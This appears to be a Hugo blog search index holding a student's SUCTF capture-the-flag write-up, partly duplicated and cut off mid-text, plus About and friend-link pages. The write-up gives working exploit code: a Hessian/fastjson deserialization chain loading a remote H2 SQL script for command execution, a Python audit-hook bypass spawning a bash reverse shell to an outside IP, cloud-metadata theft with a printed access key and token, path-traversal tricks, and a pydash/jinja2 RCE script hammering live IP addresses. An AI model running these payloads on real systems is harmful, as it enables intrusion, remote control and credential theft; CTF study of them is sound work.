[{"categories":null,"contents":" 1231 456 友链名称2 友链描述2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"友链"},{"categories":null,"contents":"一名大二在读学生\nSyclover \u0026amp; 0XFFF 成员\n对各种安全感兴趣，目前主要学习的还的是Web安全（Java 安全、云安全等）\n最爱吃，最喜欢吃的是🍉，最喜欢干的事情就是大夏天抱着半个西瓜拿勺子挖着吃然后看视频\n会打点小游戏（其实从小学之前就开始打游戏了hh\n什么都想学，但什么都不会\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] 